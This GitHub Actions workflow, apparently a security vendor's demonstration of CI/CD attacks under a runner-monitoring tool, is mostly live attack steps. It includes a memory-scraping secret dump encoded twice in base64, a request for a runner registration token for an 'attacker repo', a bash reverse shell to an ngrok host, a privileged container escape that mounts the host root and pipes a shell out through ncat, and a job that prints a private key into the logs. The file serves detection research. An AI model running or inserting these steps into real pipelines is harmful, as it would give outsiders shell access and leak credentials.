name: Workflow for POCs
on:
  workflow_dispatch:

jobs:
  tj-actions-simulation:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@rc
        with:
         egress-policy: audit
     
      - name: Checkout
        uses: actions/checkout@v4

      - name: Execute tj-action
        run: | 
          sudo python3 tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0
  pytorch-simulation:
    runs-on: ubuntu-latest
    steps:
    - uses: step-security/harden-runner@rc
      with:
         egress-policy: audit
    - name: Checkout
      uses: actions/checkout@v4
    - name: Generate a registration token for attacker repo
      run: |
          response=$(curl -X POST -H "Authorization: token github_pat_dummy_token" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/step-security-experiments/github-actions-goat/actions/runners/registration-token)
  reverse-shell: 
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@rc
        with:
          egress-policy: audit

      - name: Reverse shell
        run: |
          bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1"
  privileged-conatiner:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@rc
        with:
          egress-policy: audit

      - name: Dind escape
        run: |
          docker run --privileged --cap-add=ALL -v /:/host raesene/ncat:latest 0.tcp.us-cal-1.ngrok.io 17658 -e /bin/bash

  handle-private-key:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Decode and print private key
      env:
        # This is a base64 encoded dummy private key (NOT A REAL KEY)
        # In production, this should be stored in GitHub Secrets
        ENCODED_PRIVATE_KEY: |
          LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tTUlJRXZnSUJBREFORmdrcWhrZ0Y5dzBCQVFF
          RkFBU0NCS2d3Z2dTa0FnRUFvSUJBUTJWSlRVdDlVczhjS2pNekVmWXlqaVdBNFJ4L00yYlMx
          R0I0dDdOWHA5OEMzU0M2ZFZNdkR1aWN0R2V1clQ4ak5idkpabHRDU3VZRWM1cjRFSlduWGlz
          SzVZK1R2K2taZ1pQbTV3UUEwdzFXdXBmYVJWUFBoaEdnVDdXWnhDN1BSTE4yL2lKOW0yUUxp
          aDc5RDBRdWdINFE3clB3SVVDdzdOYjJYSVpHc1VYSzJhZmlJM24vT1NQSHVRR0dCRnhIcWI3
          VWwzM3lJdUN4UjBJcTVuem1RTENFVFJibmlHNGh4TlowSjdreHBnN21aTktDUkp3Q1FIWXRI
          SHFVVU5MaXhDTVM0NTVxajlISElNVjBsRzQ0WEtYRXpTSjFaY2o2bkNQemhSbVFwQ3dqdDFi
          T0NDVlNFSjFKaVNtOGE1U3VKS0ZMbkFpVU5rbGZyTnJHRDIzdUVJUUlEQVFBQkFvSUJBQUh0
          QmJZcDBBdzlOTi9lV0ROUDVuelZFYVhSWmM3QUNuc3BQN1VFSUZZeDkrNW5BU1pnc0l1ZUh4
          VlpiZ25QTTl6RQ==
      run: |
        echo "Decoding private key..."
        echo "$ENCODED_PRIVATE_KEY" | base64 -d > private_key.pem
        
        echo "Private key content:"
        cat private_key.pem
